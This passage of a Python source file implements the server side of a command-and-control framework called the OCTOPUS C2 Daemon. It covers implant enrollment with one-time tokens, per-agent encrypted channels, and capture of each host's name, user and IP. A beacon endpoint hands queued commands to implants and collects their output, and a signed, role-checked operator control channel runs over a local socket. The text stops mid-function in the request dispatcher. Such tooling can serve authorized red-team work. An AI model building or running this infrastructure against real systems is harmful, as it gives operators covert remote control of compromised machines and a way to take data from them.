"""C2 ASGI application with an explicit runtime initialization lifecycle.

Importing this module only defines the application and its handlers. Filesystem,
key-store, and database setup happens from :func:`create_app`, the ASGI lifespan,
or :func:`main`.
"""

from __future__ import annotations

import base64
import hashlib
import json
import logging
import os
import secrets
import socket
import sqlite3
import threading
import time
import uuid
from contextlib import asynccontextmanager, suppress
from typing import Any, Literal, cast

import uvicorn
from cryptography.hazmat.primitives.asymmetric import ed25519
from fastapi import FastAPI, HTTPException, Request

from core.c2.control_auth import (
    AuthenticatedControlPrincipal,
    OperatorRole,
)
from core.c2.control_boundary import (
    ControlBoundaryError,
    ControlReplayStore,
    ControlVerificationKeyStore,
    FramedControlBoundary,
    NotAuthorizedControlRequest,
    ResolvedControlKey,
    VerifiedControlRequest,
    extract_peer_principal,
)
from core.c2.control_commands import (
    BoundedControlErrorV2,
    C2ControlAction,
    C2ControlErrorCodeV2,
    ParticipantControlQuerySnapshotV2,
    ParticipantControlReceiptV2,
    ParticipantControlRequestV2,
    SignedControlResponseV2,
)
from core.c2.control_models import (
    calculate_health_signature_digest,
    calculate_receipt_digest,
    canonical_json_bytes,
    canonical_response_envelope_dict,
)
from core.c2.control_protocol import (
    ControlProtocolCodec,
    receive_frame,
    strict_json_loads,
)
from core.c2.control_rbac import ControlRBACPolicy
from core.c2.control_server_identity import (
    load_or_persist_daemon_response_key,
    load_or_persist_service_id,
)
from core.c2.control_signing import DaemonResponseSigner
from core.c2.crypto_engine import C2CryptoEngine
from core.c2.db_backend import C2Database
from core.c2.enrollment import EnrollmentAuthority
from core.c2.event_store import EventStore
from core.c2.grant_service import GrantService
from core.c2.key_store import KeyStore
from core.c2.operators import OperatorManager
from core.c2.protocol import (
    C2_CONTROL_PROTOCOL_VERSION,
    C2_PROTOCOL_VERSION,
)
from core.c2.resource_participant import C2DaemonResourceParticipant

logger = logging.getLogger("octopus.c2.daemon")

# ─── Configuration ───────────────────────────────────────
BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
DATA_DIR = os.path.abspath(os.environ.get("OCTOPUS_DATA_DIR", os.path.join(BASE_DIR, "data")))
KEY_DIR = os.path.join(DATA_DIR, "keys")
DB_PATH = os.path.join(DATA_DIR, "c2.db")
SOCK_FILE = os.environ.get("OCTOPUS_C2_SOCKET", "/tmp/octopus.sock")
KEYSTORE_PASSPHRASE_FILE = os.path.join(KEY_DIR, "keystore.passphrase")
ENROLLMENT_KEY_FILE = os.path.join(KEY_DIR, "enrollment.key")
SERVICE_ID_FILE = os.path.join(KEY_DIR, "service_id")
DAEMON_RESPONSE_KEY_FILE = os.environ.get("OCTOPUS_C2_DAEMON_KEY_FILE", os.path.join(KEY_DIR, "control-response.key"))
MAX_REGISTER_BODY = 64 * 1024
MAX_BEACON_BODY = 1024 * 1024
MAX_RESULTS_PER_BEACON = 100
MAX_RESULT_BYTES = 256 * 1024


def _load_or_create_keystore_passphrase() -> str:
    configured = os.environ.get("OCTOPUS_C2_KEY_PASSPHRASE", "")
    if configured:
        if len(configured) < 16:
            raise RuntimeError("OCTOPUS_C2_KEY_PASSPHRASE must be at least 16 characters")
        return configured
    if os.path.exists(KEYSTORE_PASSPHRASE_FILE):
        with suppress(Exception):
            os.chmod(KEYSTORE_PASSPHRASE_FILE, 0o600)
        with open(KEYSTORE_PASSPHRASE_FILE, encoding="utf-8") as handle:
            value = handle.read().strip()
        if len(value) < 32:
            raise RuntimeError("invalid local KeyStore passphrase file")
        return value

    value = secrets.token_urlsafe(48)
    with suppress(Exception):
        descriptor = os.open(
            KEYSTORE_PASSPHRASE_FILE,
            os.O_WRONLY | os.O_CREAT | os.O_EXCL,
            0o600,
        )
        with os.fdopen(descriptor, "w", encoding="utf-8") as handle:
            handle.write(value)
            handle.flush()
            os.fsync(handle.fileno())
    return value


def _load_or_create_service_id() -> str:
    return load_or_persist_service_id(SERVICE_ID_FILE)


def _load_or_create_daemon_response_key() -> tuple[str, ed25519.Ed25519PrivateKey, bytes]:
    """Load or generate Ed25519 response private key and return (key_id, private_key, public_bytes)."""
    return load_or_persist_daemon_response_key(
        DAEMON_RESPONSE_KEY_FILE,
        env_secret=os.environ.get("OCTOPUS_C2_DAEMON_SECRET"),
    )


# Module-level singletons
key_store: Any = None
crypto: Any = None
db: Any = None
events: Any = None
operators: Any = None
enrollment: Any = None
_components_initialized = False
_components_lock = threading.Lock()


def get_control_db_path() -> str:
    db_path = os.environ.get("OCTOPUS_C2_DB_PATH", DB_PATH)
    if db_path == ":memory:" and os.environ.get("OCTOPUS_C2_ALLOW_EPHEMERAL_CONTROL_STATE") != "1":
        raise RuntimeError("ephemeral control state is forbidden in production")
    return os.path.abspath(db_path) if db_path != ":memory:" else ":memory:"


def _initialize_components() -> None:
    """Initialize persistent C2 state exactly once for this process."""
    global _components_initialized, crypto, db, enrollment, events, key_store, operators
    if _components_initialized:
        return
    with _components_lock:
        if _components_initialized:
            return

        with suppress(Exception):
            os.makedirs(DATA_DIR, exist_ok=True)
            os.makedirs(KEY_DIR, exist_ok=True)
            os.chmod(DATA_DIR, 0o700)
            os.chmod(KEY_DIR, 0o700)

        initialized_key_store = KeyStore(key_dir=KEY_DIR)
        key_passphrase = _load_or_create_keystore_passphrase()
        if initialized_key_store.exists():
            if not initialized_key_store.unlock(key_passphrase):
                raise RuntimeError("unable to unlock C2 KeyStore")
        else:
            initialized_key_store.generate(key_passphrase)

        initialized_crypto = C2CryptoEngine(
            key_dir=KEY_DIR,
            private_key=initialized_key_store.get_or_create_x25519_private_key(),
        )
        ctrl_db = get_control_db_path()
        initialized_db = C2Database(db_path=ctrl_db)
        initialized_events = EventStore(db_path=ctrl_db)
        initialized_operators = OperatorManager(db_path=ctrl_db)
        initialized_enrollment = EnrollmentAuthority(ENROLLMENT_KEY_FILE)

        if key_store is None:
            key_store = initialized_key_store
        if crypto is None:
            crypto = initialized_crypto
        if db is None:
            db = initialized_db
        if events is None:
            events = initialized_events
            events.subscribe("agent.registered", _on_agent_registered)
            events.subscribe("task.queued", _on_task_queued)
        if operators is None:
            operators = initialized_operators
        if enrollment is None:
            enrollment = initialized_enrollment
        _components_initialized = True


@asynccontextmanager
async def _lifespan(_application: FastAPI):
    _initialize_components()
    yield


app = FastAPI(
    title="OCTOPUS C2 Daemon",
    version=C2_PROTOCOL_VERSION,
    docs_url=None,
    redoc_url=None,
    lifespan=_lifespan,
)


def create_app() -> FastAPI:
    """Enter the persistent runtime lifecycle and return the ASGI application."""
    _initialize_components()
    return app


# ─── Event Handlers (Projections) ────────────────────────


def _on_agent_registered(event):
    """Projection: update agents table from registration event."""
    p = getattr(event, "payload", event)
    if hasattr(db, "register_agent"):
        db.register_agent(
            agent_id=p["agent_id"],
            hostname=p.get("hostname", "Unknown"),
            os_name=p.get("os", "Unknown"),
            user=p.get("user", "Unknown"),
            ip=p.get("ip", "Unknown"),
            crypto_state=p.get("crypto_state"),
        )


def _on_task_queued(event):
    """Projection: insert task into tasks table."""
    p = getattr(event, "payload", event)
    if hasattr(db, "queue_task"):
        db.queue_task(p["task_id"], p["agent_id"], p["command"])
    elif hasattr(db, "create_task"):
        db.create_task(
            task_id=p["task_id"],
            agent_id=p["agent_id"],
            command=p["command"],
            args=p.get("args", []),
        )


# ─── REST / Beacon Endpoints ─────────────────────────────


async def _read_json_limited(request: Request, max_bytes: int) -> dict[str, Any]:
    cl_header = request.headers.get("content-length")
    if cl_header is not None:
        try:
            cl = int(cl_header)
        except ValueError as exc:
            raise HTTPException(status_code=400, detail="Invalid Content-Length") from exc
        if cl > max_bytes:
            raise HTTPException(status_code=413, detail="Request too large")
    body = await request.body()
    if len(body) > max_bytes:
        raise HTTPException(status_code=413, detail="Request too large")
    try:
        data = json.loads(body)
    except Exception as exc:
        raise HTTPException(status_code=400, detail="Invalid JSON") from exc
    if not isinstance(data, dict):
        raise HTTPException(status_code=400, detail="JSON object required")
    return data


def _load_agent_crypto(agent_id: str) -> bool:
    if hasattr(crypto, "agent_state") and agent_id in crypto.agent_state:
        return True
    raw_state = db.get_agent_crypto(agent_id) if hasattr(db, "get_agent_crypto") else None
    if not raw_state:
        return False
    aad = agent_id.encode("utf-8")
    if isinstance(raw_state, str):
        try:
            state = key_store.unseal_json(raw_state, aad=aad)
        except Exception:
            try:
                state = key_store.unseal_json(raw_state)
            except Exception:
                return False
    elif isinstance(raw_state, dict):
        state = raw_state
        if hasattr(key_store, "seal_json"):
            try:
                sealed = key_store.seal_json(state, aad=aad)
            except TypeError:
                sealed = key_store.seal_json(state)
            if hasattr(db, "update_agent_crypto"):
                db.update_agent_crypto(agent_id, sealed)
    else:
        return False

    if not isinstance(state, dict) or "key" not in state:
        return False
    raw_key = state["key"]
    if isinstance(raw_key, str):
        raw_key = bytes.fromhex(raw_key) if len(raw_key) == 64 else raw_key.encode("latin1")
    if hasattr(crypto, "agent_state"):
        crypto.agent_state[agent_id] = {
            "key": raw_key,
            "rx_seq": state.get("rx_seq", 0),
            "tx_seq": state.get("tx_seq", 0),
        }
    return True


def _sealed_agent_crypto(agent_id: str) -> str:
    state = crypto.agent_state.get(agent_id, {}) if hasattr(crypto, "agent_state") else {}
    key_val = state.get("key", b"")
    if isinstance(key_val, bytes):
        key_val = key_val.hex()
    d = {
        "key": key_val,
        "rx_seq": state.get("rx_seq", 0),
        "tx_seq": state.get("tx_seq", 0),
    }
    if hasattr(key_store, "seal_json"):
        try:
            return key_store.seal_json(d, aad=agent_id.encode("utf-8"))
        except TypeError:
            return key_store.seal_json(d)
    return json.dumps(d)


@app.post("/register")
async def register_agent(request: Request):
    """Handle implant registration."""
    _initialize_components()
    data = await _read_json_limited(request, MAX_REGISTER_BODY)
    raw_pub = data.get("client_pub", "")
    enc_data = data.get("data", "")
    token = data.get("enrollment_token", "")

    if not raw_pub or not enc_data or not token:
        raise HTTPException(status_code=400, detail="Missing required registration fields")

    if hasattr(enrollment, "consume"):
        try:
            consumed = enrollment.consume(token)
        except TypeError:
            consumed = enrollment.consume(token, db)
        if not consumed:
            raise HTTPException(status_code=401, detail="Invalid enrollment token")
    elif hasattr(enrollment, "verify_and_burn"):
        valid, _ = enrollment.verify_and_burn(token)
        if not valid:
            raise HTTPException(status_code=401, detail="Invalid or expired enrollment token")

    try:
        client_pub = base64.b64decode(raw_pub)
    except Exception as exc:
        raise HTTPException(status_code=400, detail="Invalid public key encoding") from exc

    if len(client_pub) != 32:
        raise HTTPException(status_code=400, detail="Registration failed")

    agent_id = f"AGT-{secrets.token_hex(8)}"
    if hasattr(crypto, "derive_shared_key"):
        shared_key = crypto.derive_shared_key(client_pub)
        if hasattr(crypto, "agent_state"):
            crypto.agent_state[agent_id] = {
                "key": shared_key,
                "rx_seq": 0,
                "tx_seq": 0,
            }
        try:
            decrypted_str = crypto.decrypt_aes_gcm(agent_id, enc_data)
            meta = json.loads(decrypted_str)
            if not isinstance(meta, dict):
                raise ValueError("Metadata must be a dictionary")
        except Exception as exc:
            if hasattr(crypto, "agent_state"):
                crypto.agent_state.pop(agent_id, None)
            raise HTTPException(status_code=400, detail="Registration failed") from exc

        sealed_state = _sealed_agent_crypto(agent_id)
        if hasattr(events, "append"):
            try:
                events.append(
                    "agent", agent_id, "agent.registered", {"agent_id": agent_id, "crypto_state": sealed_state, **meta}
                )
            except TypeError:
                events.append("agent_registered", {"agent_id": agent_id, "crypto_state": sealed_state, **meta})
        elif hasattr(events, "publish"):
            events.publish("agent.registered", {"agent_id": agent_id, "crypto_state": sealed_state, **meta})

        if hasattr(db, "register_agent"):
            db.register_agent(
                agent_id=agent_id,
                hostname=meta.get("hostname", "Unknown"),
                os_name=meta.get("os", "Unknown"),
                user=meta.get("user", "Unknown"),
                ip=getattr(request.client, "host", "Unknown") if request.client else "Unknown",
                crypto_state=sealed_state,
            )

        if hasattr(db, "get_agent_crypto"):
            stored = db.get_agent_crypto(agent_id)
            if stored is not None and stored != sealed_state:
                if hasattr(crypto, "agent_state"):
                    crypto.agent_state.pop(agent_id, None)
                raise HTTPException(status_code=400, detail="Registration failed")

        resp_data = {"agent_id": agent_id}
        enc_resp = crypto.encrypt_aes_gcm(agent_id, json.dumps(resp_data))
        return {"data": enc_resp}

    server_session = key_store.create_session(client_pub)
    events.publish(
        "agent.registered",
        {
            "agent_id": agent_id,
            "hostname": "Unknown",
            "os": "Unknown",
            "user": "Unknown",
            "ip": request.client.host if request.client else "Unknown",
            "crypto_state": {
                "session_key_hex": server_session["session_key"].hex(),
                "server_eph_pub_hex": server_session["ephemeral_pub"].hex(),
            },
        },
    )
    return {
        "agent_id": agent_id,
        "server_x25519_pub": base64.b64encode(server_session["ephemeral_pub"]).decode("ascii"),
    }


register = register_agent


@app.post("/beacon")
async def beacon(request: Request):
    """Handle implant heartbeat / beacon."""
    _initialize_components()
    data = await _read_json_limited(request, MAX_BEACON_BODY)
    enc_data = data.get("data")
    if not isinstance(enc_data, str) or not enc_data:
        raise HTTPException(status_code=400, detail="Missing encrypted payload")

    agent_id = request.headers.get("Agent-ID") or data.get("agent_id")
    if not agent_id or not _load_agent_crypto(agent_id):
        raise HTTPException(status_code=401, detail="Agent not found")

    if hasattr(db, "update_agent_seen") and not db.update_agent_seen(
        agent_id=agent_id, ip=getattr(request.client, "host", "127.0.0.1")
    ):
        raise HTTPException(status_code=401, detail="Agent not found")

    try:
        if hasattr(crypto, "decrypt_aes_gcm"):
            decrypted_str = crypto.decrypt_aes_gcm(agent_id, enc_data)
            beacon_data = json.loads(decrypted_str)
        else:
            agent_record = db.get_agent(agent_id)
            crypto_state = agent_record["crypto_state"]
            if isinstance(crypto_state, str):
                crypto_state = json.loads(crypto_state)
            session_key = bytes.fromhex(crypto_state["session_key_hex"])
            decrypted_bytes = crypto.decrypt_payload(enc_data, session_key)
            beacon_data = json.loads(decrypted_bytes.decode("utf-8"))
    except Exception as exc:
        raise HTTPException(status_code=400, detail="Invalid beacon") from exc

    if not isinstance(beacon_data, dict):
        raise HTTPException(status_code=400, detail="Invalid beacon")

    acks = beacon_data.get("acks")
    if acks is not None:
        if not isinstance(acks, list) or not all(isinstance(a, str) and a for a in acks):
            raise HTTPException(status_code=400, detail="Invalid task acknowledgements")
        if hasattr(db, "acknowledge_tasks"):
            ack_count = db.acknowledge_tasks(agent_id, acks)
            if ack_count != len(set(acks)):
                raise HTTPException(status_code=409, detail="One or more acknowledgements were rejected")

    results = beacon_data.get("results")
    if results is not None:
        if not isinstance(results, list):
            raise HTTPException(status_code=413, detail="Too many results")
        if len(results) > MAX_RESULTS_PER_BEACON:
            raise HTTPException(status_code=400, detail="Too many results in beacon")
        if not all(isinstance(r, dict) and r.get("task_id") for r in results):
            raise HTTPException(status_code=409, detail="One or more task results were rejected")
        if hasattr(db, "update_task_result"):
            for r in results:
                task_id = r["task_id"]
                output = r.get("output", "")
                status = r.get("error") or r.get("status", "completed")
                err_val = r.get("error", "")
                try:
                    res = db.update_task_result(task_id, agent_id, output, err_val)
                except TypeError:
                    try:
                        res = db.update_task_result(task_id, output, status)
                    except TypeError:
                        res = db.update_task_result(task_id, agent_id, output)
                if res is False:
                    raise HTTPException(status_code=409, detail="One or more task results were rejected")

    pending_tasks = db.get_pending_tasks(agent_id) if hasattr(db, "get_pending_tasks") else []
    if hasattr(crypto, "encrypt_aes_gcm"):
        resp_enc = crypto.encrypt_aes_gcm(agent_id, json.dumps({"tasks": pending_tasks}))
    else:
        task_list = [
            {
                "task_id": t["task_id"],
                "command": t["command"],
                "args": json.loads(t["args"]) if isinstance(t.get("args"), str) else t.get("args", []),
            }
            for t in pending_tasks
        ]
        response_dict = {
            "tasks": task_list,
            "server_time": int(time.time()),
        }
        resp_enc = crypto.encrypt_payload(
            json.dumps(response_dict).encode("utf-8"),
            session_key,
        )

    sealed_state = _sealed_agent_crypto(agent_id)
    if hasattr(db, "update_agent_crypto") and not db.update_agent_crypto(agent_id, sealed_state):
        raise HTTPException(status_code=401, detail="Agent not found")

    return {"data": resp_enc}


# ─── Operator IPC Control Plane ──────────────────────────

_service_id: str | None = None
BOOT_INSTANCE_ID = uuid.uuid4().hex
DAEMON_GENERATION = os.environ.get("OCTOPUS_C2_DAEMON_GENERATION", "gen-1")
DAEMON_INSTANCE_ID = os.environ.get("OCTOPUS_C2_DAEMON_INSTANCE_ID", f"c2-daemon-{BOOT_INSTANCE_ID[:8]}")
MAX_CONTROL_FRAME_SIZE = 16 * 1024 * 1024  # 16 MiB
MAX_ACTIVE_CONTROL_CONNECTIONS = 64
MAX_REQUESTS_PER_CONNECTION = 1000

_daemon_response_key_id: str = "daemon_resp_key_1"
_daemon_response_priv: ed25519.Ed25519PrivateKey | None = None
_daemon_response_pub: bytes | None = None
_daemon_response_signer: DaemonResponseSigner | None = None

_daemon_resource_participant_instance: C2DaemonResourceParticipant | None = None
_control_codec = ControlProtocolCodec()
_replay_store_instance: ControlReplayStore | None = None
_key_store_instance: ControlVerificationKeyStore | None = None
_conn_semaphore = threading.BoundedSemaphore(MAX_ACTIVE_CONTROL_CONNECTIONS)
server_ready_event = threading.Event()


def get_service_id() -> str:
    global _service_id
    if _service_id is None:
        _service_id = _load_or_create_service_id()
    return _service_id


def get_daemon_response_signer() -> tuple[str, DaemonResponseSigner]:
    global _daemon_response_key_id, _daemon_response_priv, _daemon_response_pub, _daemon_response_signer
    if _daemon_response_signer is None:
        _daemon_response_key_id, _daemon_response_priv, _daemon_response_pub = _load_or_create_daemon_response_key()
        _daemon_response_signer = DaemonResponseSigner(_daemon_response_key_id, _daemon_response_priv)
    return _daemon_response_key_id, _daemon_response_signer


def get_daemon_response_public_key() -> bytes:
    global _daemon_response_pub
    if _daemon_response_pub is None:
        get_daemon_response_signer()
    assert _daemon_response_pub is not None
    return _daemon_response_pub


def get_daemon_resource_participant() -> C2DaemonResourceParticipant:
    global _daemon_resource_participant_instance
    if _daemon_resource_participant_instance is None:
        db_path = get_control_db_path()
        _daemon_resource_participant_instance = C2DaemonResourceParticipant(
            participant_id="c2_daemon",
            daemon_instance_id=DAEMON_INSTANCE_ID,
            db_path=db_path,
        )
    return _daemon_resource_participant_instance


def get_replay_store() -> ControlReplayStore:
    global _replay_store_instance
    if _replay_store_instance is None:
        db_path = get_control_db_path()
        _replay_store_instance = ControlReplayStore(db_path=db_path)
    return _replay_store_instance


def get_verification_key_store() -> ControlVerificationKeyStore:
    global _key_store_instance
    if _key_store_instance is None:
        db_path = get_control_db_path()
        _key_store_instance = ControlVerificationKeyStore(db_path=db_path)
    return _key_store_instance


class DaemonKeyResolver:
    """Key resolver for operator control verification keys."""

    def __init__(self) -> None:
        self._keys: dict[str, ResolvedControlKey] = {}

    def register_key(
        self,
        key_id: str,
        key_bytes: bytes | ResolvedControlKey,
        operator_id: str | None = None,
    ) -> None:
        if isinstance(key_bytes, ResolvedControlKey):
            if len(key_bytes.verification_key) != 32:
                raise ValueError("verification_key must be exactly 32 bytes")
            self._keys[key_id] = key_bytes
        elif isinstance(key_bytes, (bytes, bytearray)):
            if len(key_bytes) != 32:
                raise ValueError(f"verification_key must be exactly 32 bytes, got {len(key_bytes)}")
            self._keys[key_id] = ResolvedControlKey(
                key_id=key_id,
                operator_id=operator_id or f"op_{key_id}",
                verification_key=bytes(key_bytes),
                algorithm="ed25519",
            )
        else:
            raise TypeError("key_bytes must be 32-byte bytes or ResolvedControlKey")

    def require_key(self, key_id: str, *, now: float) -> ResolvedControlKey:
        if key_id in self._keys:
            return self._keys[key_id]
        ks = get_verification_key_store()
        resolved = ks.resolve_active(key_id, now=now)
        if resolved is not None:
            return resolved
        raise NotAuthorizedControlRequest("unknown_key_id")


class DaemonPrincipalResolver:
    """Principal resolver validating operators and mission grants from persistent DB (strictly read-only)."""

    def __init__(
        self,
        operators_mgr: OperatorManager | None = None,
        grants_svc: GrantService | None = None,
        key_store_obj: ControlVerificationKeyStore | None = None,
    ) -> None:
        self._operators_mgr = operators_mgr
        self._grants_svc = grants_svc
        self._key_store_obj = key_store_obj

    def resolve(
        self,
        *,
        key_id: str,
        peer: Any,
        mission_id: str,
        subject_id: str,
        now: float,
        resolved_key: ResolvedControlKey | None = None,
    ) -> AuthenticatedControlPrincipal:
        if resolved_key is None:
            ks = self._key_store_obj or get_verification_key_store()
            resolved_key = ks.resolve_active(key_id, now=now)

        if resolved_key is None:
            try:
                resolved_key = _key_resolver.require_key(key_id, now=now)
            except Exception:
                resolved_key = None

        if resolved_key is None:
            raise NotAuthorizedControlRequest("unknown_key_id")

        db_path = get_control_db_path()
        op_mgr = self._operators_mgr or OperatorManager(db_path)
        grant_svc = self._grants_svc or GrantService(db_path)

        op = None
        try:
            op = op_mgr.get_operator(resolved_key.operator_id, active_only=True)
        except Exception as exc:
            raise NotAuthorizedControlRequest(f"operator_lookup_failed:{exc}") from exc

        if op is None:
            raise NotAuthorizedControlRequest("operator_not_found")

        if op["subject_id"] != subject_id:
            raise NotAuthorizedControlRequest("subject_mismatch")

        peer_b = None
        try:
            peer_b = grant_svc.resolve_peer_binding(resolved_key.operator_id, uid=peer.uid, gid=peer.gid)
        except Exception as exc:
            raise NotAuthorizedControlRequest(f"peer_binding_lookup_failed:{exc}") from exc

        if peer_b is None:
            raise NotAuthorizedControlRequest("peer_not_bound")

        mission_g = None
        try:
            mission_g = grant_svc.resolve_mission_grant(
                resolved_key.operator_id, subject_id=subject_id, mission_id=mission_id
            )
        except Exception as exc:
            raise NotAuthorizedControlRequest(f"mission_grant_lookup_failed:{exc}") from exc

        if mission_g is None:
            raise NotAuthorizedControlRequest("mission_not_granted")

        return AuthenticatedControlPrincipal(
            operator_id=resolved_key.operator_id,
            subject_id=subject_id,
            role=OperatorRole(str(op["role"])),
            peer=peer,
            mission_id=mission_id,
            operator_revision=int(op.get("authorization_revision", 1)),
            peer_binding_revision=peer_b.revision if peer_b else 1,
            mission_grant_revision=mission_g.revision if mission_g else 1,
            authenticated_at=now,
            expires_at=now + 300.0,
        )


_key_resolver = DaemonKeyResolver()
_principal_resolver = DaemonPrincipalResolver()
_rbac_policy = ControlRBACPolicy()
_control_boundary_instance: FramedControlBoundary | None = None


def get_control_boundary() -> FramedControlBoundary:
    global _control_boundary_instance
    if _control_boundary_instance is None:
        _control_boundary_instance = FramedControlBoundary(
            key_resolver=_key_resolver,
            principal_resolver=_principal_resolver,
            rbac=_rbac_policy,
            replay_store=get_replay_store(),
        )
    return _control_boundary_instance


def reset_control_daemon_state() -> None:
    """Reset singletons and in-memory caches for test isolation."""
    global _control_boundary_instance, _replay_store_instance, _key_store_instance
    global _daemon_resource_participant_instance, _components_initialized
    global _key_resolver, _principal_resolver
    global key_store, crypto, db, events, operators, enrollment
    _control_boundary_instance = None
    _replay_store_instance = None
    _key_store_instance = None
    _daemon_resource_participant_instance = None
    _components_initialized = False
    key_store = None
    crypto = None
    db = None
    events = None
    operators = None
    enrollment = None
    _key_resolver = DaemonKeyResolver()
    _principal_resolver = DaemonPrincipalResolver()


def register_control_key(
    key_id: str,
    key_bytes: bytes,
    operator_id: str | None = None,
    algorithm: str = "ed25519",
) -> None:
    """Register an operator control signing key into persistent key store and resolver."""
    op_id = operator_id or f"op_{key_id}"
    _initialize_components()
    if not isinstance(key_bytes, (bytes, bytearray)) or len(key_bytes) != 32:
        raise ValueError(
            f"verification_key must be exactly 32 bytes, got {len(key_bytes) if isinstance(key_bytes, (bytes, bytearray)) else type(key_bytes)}"
        )
    raw_pub = bytes(key_bytes)
    ks = get_verification_key_store()
    ks.register_key(
        key_id=key_id,
        operator_id=op_id,
        verification_key=raw_pub,
        algorithm=algorithm,
    )
    _key_resolver.register_key(key_id, raw_pub, operator_id=op_id)


def _sign_response_envelope(
    response: (ParticipantControlReceiptV2 | ParticipantControlQuerySnapshotV2 | BoundedControlErrorV2),
    request: ParticipantControlRequestV2 | None = None,
) -> SignedControlResponseV2:
    """Wrap and sign a control response envelope using daemon Ed25519 response key."""
    if request is not None:
        req_digest = request.authorization.request_digest
        req_nonce = request.authorization.nonce
    else:
        req_digest = "0" * 64
        req_nonce = "0" * 32

    if isinstance(response, ParticipantControlReceiptV2):
        resp_type = "receipt"
        res_dict = {
            "action": response.action.value if hasattr(response.action, "value") else str(response.action),
            "daemon_instance_id": response.daemon_instance_id,
            "participant_id": response.participant_id,
            "receipt_digest": response.receipt_digest,
            "receipt_ref": response.receipt_ref,
            "resource_ref": response.resource_ref,
            "resource_revision": response.resource_revision,
            "result_payload_b64u": response.result_payload_b64u,
            "result_payload_digest": response.result_payload_digest,
            "result_payload_schema_id": response.result_payload_schema_id,
            "transaction_id": response.transaction_id,
            "type": "receipt",
        }
    elif isinstance(response, ParticipantControlQuerySnapshotV2):
        resp_type = "snapshot"
        res_dict = {
            "participant_id": response.participant_id,
            "phase": response.phase.value if hasattr(response.phase, "value") else str(response.phase),
            "receipt_digest": response.receipt_digest,
            "receipt_ref": response.receipt_ref,
            "resource_ref": response.resource_ref,
            "resource_revision": response.resource_revision,
            "result_payload_b64u": response.result_payload_b64u,
            "result_payload_digest": response.result_payload_digest,
            "result_payload_schema_id": response.result_payload_schema_id,
            "snapshot_digest": response.snapshot_digest,
            "transaction_id": response.transaction_id,
            "type": "snapshot",
        }
    elif isinstance(response, BoundedControlErrorV2):
        resp_type = "error"
        res_dict = {
            "detail_ref": response.detail_ref,
            "reason_code": response.reason_code.value
            if hasattr(response.reason_code, "value")
            else str(response.reason_code),
            "retryable": response.retryable,
            "type": "error",
        }
    else:
        raise TypeError(f"Unsupported response type: {type(response)}")

    payload_bytes = canonical_json_bytes(res_dict)
    payload_b64u = base64.urlsafe_b64encode(payload_bytes).decode("utf-8").rstrip("=")
    payload_digest = hashlib.sha256(payload_bytes).hexdigest()
    issued_at_ms = int(time.time() * 1000)

    key_id, signer = get_daemon_response_signer()
    service_id = get_service_id()

    envelope_dict = canonical_response_envelope_dict(
        protocol_version=C2_CONTROL_PROTOCOL_VERSION,
        daemon_instance_id=DAEMON_INSTANCE_ID,
        daemon_generation=DAEMON_GENERATION,
        service_id=service_id,
        boot_instance_id=BOOT_INSTANCE_ID,
        request_digest=req_digest,
        request_nonce=req_nonce,
        response_type=resp_type,
        response_payload_b64u=payload_b64u,
        response_digest=payload_digest,
        issued_at_ms=issued_at_ms,
        key_id=key_id,
    )
    signature = signer.sign_envelope_dict(envelope_dict)

    return SignedControlResponseV2(
        protocol_version="2.0",
        service_id=service_id,
        boot_instance_id=BOOT_INSTANCE_ID,
        daemon_generation=DAEMON_GENERATION,
        request_digest=req_digest,
        request_nonce=req_nonce,
        response_type=cast(Literal["receipt", "snapshot", "error"], resp_type),
        response_payload_b64u=payload_b64u,
        response_digest=payload_digest,
        issued_at_ms=issued_at_ms,
        key_id=key_id,
        signature=signature,
    )


def _dispatch_verified_request(
    verified: VerifiedControlRequest,
) -> ParticipantControlReceiptV2 | ParticipantControlQuerySnapshotV2 | BoundedControlErrorV2:
    """Dispatch authorized control request to participant and handlers."""
    req: ParticipantControlRequestV2 = verified.request
    action = req.action
    tx_id = req.authorization.transaction_id
    participant = get_daemon_resource_participant()

    if action in (C2ControlAction.PING, "ping"):
        rcpt_ref = f"rcpt_ping_{secrets.token_hex(4)}"
        rcpt_dig = calculate_receipt_digest(
            transaction_id=tx_id,
            participant_id=req.authorization.participant_id or "c2_daemon",
            action="ping",
            resource_ref="c2_daemon",
            resource_revision=1,
            receipt_ref=rcpt_ref,
            daemon_instance_id=DAEMON_INSTANCE_ID,
            result_payload_schema_id=req.payload_schema_id,
            result_payload_digest=req.payload_digest,
            protocol_version=C2_CONTROL_PROTOCOL_VERSION,
        )
        return ParticipantControlReceiptV2(
            transaction_id=tx_id,
            participant_id=req.authorization.participant_id or "c2_daemon",
            action=C2ControlAction.PING,
            resource_ref="c2_daemon",
            resource_revision=1,
            receipt_ref=rcpt_ref,
            receipt_digest=rcpt_dig,
            daemon_instance_id=DAEMON_INSTANCE_ID,
            result_payload_schema_id=req.payload_schema_id,
            result_payload_digest=req.payload_digest,
            result_payload_b64u=req.canonical_payload_b64u,
        )

    is_readiness = (
        action == C2ControlAction.READINESS
        or getattr(action, "value", None) == "readiness"
        or str(action).lower().endswith("readiness")
    )
    is_version = (
        action == C2ControlAction.VERSION
        or getattr(action, "value", None) == "version"
        or str(action).lower().endswith("version")
    )
    if is_readiness or is_version:
        rcpt_ref = f"rcpt_ready_{secrets.token_hex(4)}"
        act_name = "readiness" if is_readiness else "version"
        ret_action = C2ControlAction.READINESS if is_readiness else C2ControlAction.VERSION
        rcpt_dig = calculate_receipt_digest(
            transaction_id=tx_id,
            participant_id=req.authorization.participant_id or "c2_daemon",
            action=act_name,
            resource_ref="c2_daemon",
            resource_revision=1,
            receipt_ref=rcpt_ref,
            daemon_instance_id=DAEMON_INSTANCE_ID,
            result_payload_schema_id=req.payload_schema_id,
            result_payload_digest=req.payload_digest,
            protocol_version=C2_CONTROL_PROTOCOL_VERSION,
        )
        return ParticipantControlReceiptV2(
            transaction_id=tx_id,
            participant_id=req.authorization.participant_id or "c2_daemon",
            action=ret_action,
            resource_ref="c2_daemon",
            resource_revision=1,
            receipt_ref=rcpt_ref,
            receipt_digest=rcpt_dig,
            daemon_instance_id=DAEMON_INSTANCE_ID,
            result_payload_schema_id=req.payload_schema_id,
            result_payload_digest=req.payload_digest,
            result_payload_b64u=req.canonical_payload_b64u,
        )

    if action == C2ControlAction.PREPARE_C2_RESOURCE:
        return participant.prepare(req, verified.principal, verified.resolved_key)

    if action == C2ControlAction.COMMIT_C2_RESOURCE:
        return participant.commit(req, verified.principal, verified.resolved_key)

    if action == C2ControlAction.FINALIZE_C2_RESOURCE_VISIBILITY:
        return participant.finalize_visibility(req, verified.principal, verified.resolved_key)

    if action == C2ControlAction.ABORT_C2_RESOURCE:
